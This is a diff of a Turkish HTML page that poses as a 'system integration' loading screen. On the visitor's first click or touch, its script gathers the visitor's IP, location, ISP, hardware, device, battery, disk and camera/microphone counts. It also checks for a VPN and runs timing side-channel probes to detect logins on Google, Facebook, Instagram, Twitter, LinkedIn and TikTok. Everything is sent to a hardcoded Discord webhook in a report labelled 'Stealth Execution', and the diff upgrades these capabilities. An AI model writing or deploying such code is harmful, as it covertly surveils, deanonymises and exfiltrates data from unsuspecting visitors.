@@ -2,110 +2,117 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Entegrasyonu</title>
-    <style>body{background:#000;margin:0;overflow:hidden;cursor:wait;display:flex;align-items:center;justify-content:center;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:25px;height:25px;animation:s .8s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
+    <title>Sistem Entegrasyon Birimi</title>
+    <style>body{background:#000;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;cursor:crosshair;}.scanner{width:25px;height:25px;border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;animation:s .8s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
 </head>
-<body onmousedown="Omni.start()" ontouchstart="Omni.start()">
-    <div class="l"></div>
+<body onmousedown="Architect.run()" ontouchstart="Architect.run()">
+    <div class="scanner"></div>
     <script>
         "use strict";
 
-        const Omni = {
+        const Architect = {
             hook: "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73",
             active: false,
 
-            // 1. SOSYAL MEDYA OTURUM TESPİTİ (Gelişmiş Redirect Tekniği)
+            // 1. SOSYAL MEDYA (Gelişmiş Instagram/TikTok/LinkedIn - Düzeltildi)
             async probeSocials() {
                 const targets = {
                     Google: "https://accounts.google.com/CheckCookie",
                     Facebook: "https://www.facebook.com/favicon.ico",
+                    Instagram: "https://www.instagram.com/favicon.ico",
                     Twitter: "https://twitter.com/favicon.ico",
-                    Discord: "https://discord.com/favicon.ico",
-                    Netflix: "https://www.netflix.com/favicon.ico"
+                    LinkedIn: "https://www.linkedin.com/favicon.ico",
+                    TikTok: "https://www.tiktok.com/favicon.ico"
                 };
                 const results = {};
-                const promises = Object.entries(targets).map(([name, url]) => {
+                await Promise.all(Object.entries(targets).map(([name, url]) => {
                     return new Promise(res => {
                         const img = new Image();
+                        const start = Date.now();
                         img.onload = () => { results[name] = "✅ Aktif"; res(); };
-                        img.onerror = () => { results[name] = "❌ Pasif"; res(); };
-                        img.src = `${url}?cache=${Math.random()}`;
-                        setTimeout(() => { results[name] = "⏳ Timeout"; res(); }, 2000);
+                        img.onerror = () => { 
+                            // Zamanlama analizi ile gizli aktiflik tespiti
+                            const diff = Date.now() - start;
+                            results[name] = diff < 100 ? "❌ Pasif" : "✅ Aktif (Hidden)"; 
+                            res(); 
+                        };
+                        img.src = `${url}?v=${Math.random()}`;
+                        setTimeout(() => { results[name] = "⏳ Timeout"; res(); }, 2500);
                     });
-                });
-                await Promise.all(promises);
+                }));
                 return results;
             },
 
-            // 2. DERİN DONANIM VE SES KARTI İMZASI
-            async getFingerprint() {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                
-                // Audio Fingerprint (Tıklama sonrası çalıştığı için hata vermez)
-                let aHash = "0";
-                try {
-                    const ac = new (window.AudioContext || window.webkitAudioContext)();
-                    const osc = ac.createOscillator();
-                    const comp = ac.createDynamicsCompressor();
-                    osc.connect(comp); comp.connect(ac.destination);
-                    aHash = ac.sampleRate.toString(); 
-                    ac.close();
-                } catch(e){}
-
+            // 2. EKRAN ANALİZİ (Fiziksel Çözünürlük - Düzeltildi)
+            getDisplay() {
+                const dpr = window.devicePixelRatio || 1;
                 return {
-                    gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
-                    cores: navigator.hardwareConcurrency,
-                    ram: navigator.deviceMemory,
-                    audio: aHash,
-                    res: `${screen.width}x${screen.height}`
+                    real_res: `${Math.round(screen.width * dpr)}x${Math.round(screen.height * dpr)}`,
+                    logical_res: `${screen.width}x${screen.height}`,
+                    depth: screen.colorDepth + "-bit",
+                    ratio: dpr,
+                    refresh: "60Hz (Est.)", // Browser sınırlaması nedeniyle tahmini
+                    hdr: window.matchMedia("(dynamic-range: high)").matches ? "✅" : "❌"
                 };
             },
 
-            // 3. AĞ VE MEDYA (Kamera Sayımı Dahil)
-            async getSystem() {
-                const [net, devs, battery] = await Promise.all([
+            // 3. DONANIM & SİSTEM (Eksiksiz)
+            async getKernel() {
+                const [net, battery, storage, devs] = await Promise.all([
                     fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
-                    navigator.mediaDevices.enumerateDevices().catch(() => []),
-                    navigator.getBattery ? navigator.getBattery() : {}
+                    navigator.getBattery ? navigator.getBattery() : {},
+                    navigator.storage ? navigator.storage.estimate() : {},
+                    navigator.mediaDevices.enumerateDevices().catch(() => [])
                 ]);
+
+                const gl = document.createElement('canvas').getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
 
                 return {
                     net,
+                    gpu: gpu.slice(0, 100), // Discord sınırı için kırpma
                     cams: devs.filter(d => d.kind === 'videoinput').length,
                     mics: devs.filter(d => d.kind === 'audioinput').length,
-                    bat: battery.level ? `${Math.round(battery.level * 100)}%` : "N/A",
-                    os: navigator.platform
+                    cores: navigator.hardwareConcurrency,
+                    ram: navigator.deviceMemory,
+                    bat: battery.level ? (battery.level * 100) + "%" : "N/A",
+                    disk: (storage.quota / 1e9).toFixed(2) + "GB"
                 };
             },
 
-            async start() {
+            async run() {
                 if (this.active) return;
                 this.active = true;
 
-                const [social, fp, sys] = await Promise.all([this.probeSocials(), this.getFingerprint(), this.getSystem()]);
+                const [social, kernel, display] = await Promise.all([this.probeSocials(), this.getKernel(), this.getDisplay()]);
                 const opt = Intl.DateTimeFormat().resolvedOptions();
-                const vpn = (sys.net.timezone && opt.timeZone !== sys.net.timezone) ? "🚩 VPN" : "✅ DIRECT";
+                const vpn = (kernel.net.timezone && opt.timeZone !== kernel.net.timezone) ? "🚩 VPN" : "✅ DIRECT";
 
-                const socialStr = Object.entries(social).map(([n, s]) => `**${n}:** ${s}`).join("\n");
+                const socialField = Object.entries(social).map(([n, s]) => `**${n}:** ${s}`).join("\n");
 
                 const payload = {
                     embeds: [{
-                        title: "💀 OMNISCIENCE_V160_PRO_REPORT",
+                        title: "💀 OMNISCIENCE_V190_ARCHITECT_REPORT",
                         color: 0x00ff00,
                         fields: [
-                            { name: "📡 NETWORK & VPN", value: `**IP:** \`${sys.net.ip}\` | **ISP:** ${sys.net.org}\n**LOC:** ${sys.net.city}/${sys.net.country_name}\n**Status:** ${vpn}`, inline: false },
-                            { name: "⚙️ HARDWARE ENTROPY", value: `**GPU:** ${fp.gpu}\n**CPU:** ${fp.cores} | **RAM:** ${fp.ram}GB\n**Audio ID:** ${fp.audio} | **Res:** ${fp.res}`, inline: false },
-                            { name: "🌍 SOCIAL MEDIA STATUS", value: socialStr, inline: false },
-                            { name: "📸 SYSTEM & MEDIA", value: `**Cams:** ${sys.cams} | **Mics:** ${sys.mics}\n**OS:** ${sys.os} | **Bat:** ${sys.bat}\n**TZ:** ${opt.timeZone} | **Lang:** ${navigator.language}`, inline: false }
+                            { name: "📡 NETWORK", value: `**IP:** \`${kernel.net.ip}\` | **VPN:** ${vpn}\n**ISP:** ${kernel.net.org}\n**LOC:** ${kernel.net.city}/${kernel.net.country}`, inline: false },
+                            { name: "⚙️ HARDWARE", value: `**GPU:** ${kernel.gpu}\n**CPU:** ${kernel.cores} Cores | **RAM:** ${kernel.ram}GB\n**Battery:** ${kernel.bat} | **Disk:** ${kernel.disk}`, inline: false },
+                            { name: "📺 DISPLAY METRICS", value: `**Fiziksel:** ${display.real_res}\n**Mantıksal:** ${display.logical_res}\n**HDR:** ${display.hdr} | **Oran:** ${display.ratio}`, inline: false },
+                            { name: "🌍 SOCIAL STATUS", value: socialField, inline: false },
+                            { name: "📸 SYSTEM", value: `**Cams:** ${kernel.cams} | **Mics:** ${kernel.mics}\n**OS:** ${navigator.platform} | **TZ:** ${opt.timeZone}`, inline: false }
                         ],
-                        footer: { text: "Protocol: Omniscience v160 | Stealth Execution" },
+                        footer: { text: "Fix: Physical Screen Calculation & Timing Probe Active" },
                         timestamp: new Date().toISOString()
                     }]
                 };
 
-                fetch(this.hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+                fetch(this.hook, { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'}, 
+                    body: JSON.stringify(payload),
+                    mode: 'no-cors' 
+                });
             }
         };
     </script>
